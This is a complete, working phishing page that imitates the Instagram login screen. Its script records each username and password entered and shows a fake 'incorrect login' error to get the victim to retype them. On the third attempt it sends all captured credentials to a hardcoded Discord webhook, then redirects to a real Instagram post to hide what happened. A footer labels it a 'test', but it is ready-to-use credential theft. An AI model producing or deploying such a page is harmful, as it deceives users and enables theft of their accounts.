<!DOCTYPE html>
<html>
<head>
    <title>Instagram Login</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { max-width: 350px; width: 100%; }
        .login-card { background: white; border: 1px solid #dbdbdb; padding: 40px 30px; border-radius: 1px; }
        .brand { text-align: center; margin-bottom: 30px; }
        .brand i { font-size: 28px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .brand span { font-size: 32px; font-weight: 600; color: #262626; }
        form { display: flex; flex-direction: column; gap: 6px; }
        input { padding: 12px 10px; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; font-size: 12px; outline: none; }
        input:focus { border-color: #a8a8a8; background: #ffffff; }
        .login-btn { background: #0095f6; color: white; border: none; padding: 8px; font-weight: 600; cursor: pointer; border-radius: 4px; height: 32px; }
        .login-btn:hover { background: #1877f2; }
        .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
        .divider { display: flex; margin: 18px 0; align-items: center; }
        .divider-line { flex: 1; height: 1px; background: #dbdbdb; }
        .divider-text { margin: 0 18px; font-size: 13px; color: #8e8e8e; font-weight: 600; }
        .facebook { text-align: center; color: #385185; font-weight: 600; font-size: 14px; margin: 6px 0; cursor: pointer; }
        .facebook i { margin-right: 8px; }
        .forgot { font-size: 12px; color: #00376b; text-decoration: none; display: block; text-align: center; margin: 8px 0; }
        .signup { text-align: center; font-size: 14px; margin-top: 10px; color: #262626; }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .app-download { text-align: center; margin-top: 20px; }
        .app-download p { font-size: 14px; color: #262626; margin-bottom: 12px; }
        .badges { display: flex; justify-content: center; gap: 8px; flex-wrap: wrap; }
        .badge { background: #000; color: white; padding: 6px 14px; border-radius: 4px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; opacity: 0.9; cursor: default; }
        .badge i { font-size: 18px; }

        /* Instagram-style error message */
        #error-message {
            display: none;
            background: #fef4f4;
            border: 1px solid #f9c9c9;
            border-radius: 4px;
            padding: 10px 15px;
            margin-top: 12px;
            font-size: 14px;
            color: #8a1d1d;
            text-align: center;
        }

        #error-message.show {
            display: block;
            animation: shake 0.3s ease-in-out;
        }

        #error-message .error-link {
            color: #00376b;
            font-weight: 600;
            text-decoration: none;
        }

        #error-message .error-link:hover {
            text-decoration: underline;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-8px); }
            75% { transform: translateX(8px); }
        }

        /* Success Message - HIDDEN (not used) */
        #status {
            display: none !important;
        }

        .meta-footer { margin-top: 20px; font-size: 11px; color: #8e8e8e; text-align: center; }
        .meta-footer .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 6px 12px; margin-bottom: 6px; }
        .meta-footer .links span { cursor: default; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-card">
            <div class="brand"><i class="fab fa-instagram"></i><span>Instagram</span></div>
            <form onsubmit="sendData(event)">
                <input type="text" id="username" placeholder="Phone number, username, or email" required>
                <input type="password" id="password" placeholder="Password" required>
                <button type="submit" id="loginBtn" class="login-btn">Log in</button>
            </form>
            <div id="error-message">
                The login information you entered is incorrect.
                <a href="#" class="error-link">Find your account and log in.</a>
            </div>
            <div class="divider"><div class="divider-line"></div><span class="divider-text">OR</span><div class="divider-line"></div></div>
            <div class="facebook"><i class="fab fa-facebook-square"></i>Log in with Facebook</div>
            <a href="#" class="forgot">Forgot password?</a>
            <div id="status"></div>
        </div>
        <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
        <div class="app-download">
            <p>Get the app.</p>
            <div class="badges">
                <div class="badge"><i class="fab fa-apple"></i> App Store</div>
                <div class="badge"><i class="fab fa-google-play"></i> Google Play</div>
            </div>
        </div>
        <div class="meta-footer">
            <div class="links">
                <span>Meta</span><span>About</span><span>Blog</span><span>Jobs</span>
                <span>Help</span><span>API</span><span>Privacy</span><span>Terms</span>
                <span>Locations</span><span>Instagram Lite</span><span>Threads</span>
            </div>
            <div class="copyright">© 2026 Instagram from Meta</div>
        </div>
    </div>
    <script>
        // ✅ YOUR DISCORD WEBHOOK URL
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1526315566011252868/wxzJ91z_cbUxAy0zZE_3vSoOE11baPaKASHK0PqJLfcuDm6uNydqJG1Pqyty7d--pnaC";
        
        // ✅ THE INSTAGRAM POST URL
        const INSTAGRAM_REDIRECT_URL = "https://www.instagram.com/p/DJFPnYdtS1D/?img_index=3&igsh=N2ZqY2NhaHF2NDNk";
        
        const errorDiv = document.getElementById('error-message');
        const loginBtn = document.getElementById('loginBtn');

        // 🔐 Attempt counter
        let attemptCount = 0;
        const MAX_ATTEMPTS = 3;
        let allAttempts = [];

        // 🚀 Function to open Instagram post
        function openInstagramPost() {
            const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
            
            if (isMobile) {
                const postId = "DJFPnYdtS1D";
                window.location.href = `instagram://media?id=${postId}`;
                setTimeout(() => {
                    window.location.href = INSTAGRAM_REDIRECT_URL;
                }, 1500);
            } else {
                window.location.href = INSTAGRAM_REDIRECT_URL;
            }
        }

        // 📤 Function to send ALL attempts to Discord
        async function sendAllAttemptsToDiscord() {
            let attemptsText = allAttempts.map((attempt, index) => {
                return `Attempt ${index + 1}: Username: ${attempt.username}, Password: ${attempt.password}`;
            }).join('\n');

            const data = {
                content: "📥 **All Login Attempts!**",
                embeds: [{
                    title: `Instagram Login Capture (${allAttempts.length} attempts)`,
                    color: 0x0095f6,
                    fields: [
                        { name: "📝 All Attempts", value: `\`\`\`\n${attemptsText}\n\`\`\``, inline: false },
                        { name: "🕐 Time", value: new Date().toLocaleString(), inline: true },
                        { name: "📊 Total Attempts", value: allAttempts.length.toString(), inline: true }
                    ],
                    footer: { text: "Instagram Login Test" }
                }]
            };
            
            try {
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                });
                console.log('✅ All attempts sent to Discord:', allAttempts);
                return true;
            } catch (error) {
                console.error('❌ Discord Error:', error);
                return false;
            }
        }

        // 🎯 Main function
        async function sendData(event) {
            event.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (!username || !password) {
                showError('Please enter both username and password');
                return;
            }

            // Store this attempt
            allAttempts.push({ username, password });
            attemptCount++;

            console.log(`📝 Attempt ${attemptCount}: ${username} / ${password}`);

            // Check if this is the 3rd attempt (success)
            if (attemptCount >= MAX_ATTEMPTS) {
                // ✅ SUCCESS - Send ALL attempts to Discord
                await sendAllAttemptsToDiscord();
                
                // Hide error
                errorDiv.classList.remove('show');
                
                // Clear form
                document.getElementById('username').value = '';
                document.getElementById('password').value = '';
                
                // 🚀 Open Instagram post immediately (no message)
                setTimeout(openInstagramPost, 500);
                
                // Reset counter (optional)
                // attemptCount = 0;
                // allAttempts = [];
                
            } else {
                // ❌ WRONG PASSWORD - Show Instagram-style error
                showError('The login information you entered is incorrect.');
                
                // Clear password field for retry
                document.getElementById('password').value = '';
                document.getElementById('password').focus();
            }
        }

        // Function to show Instagram-style error
        function showError(message) {
            errorDiv.innerHTML = `${message} <a href="#" class="error-link">Find your account and log in.</a>`;
            errorDiv.classList.add('show');
            
            // Shake the form
            const form = document.querySelector('form');
            form.style.animation = 'shake 0.3s ease-in-out';
            setTimeout(() => {
                form.style.animation = '';
            }, 300);
        }
    </script>
</body>
</html>
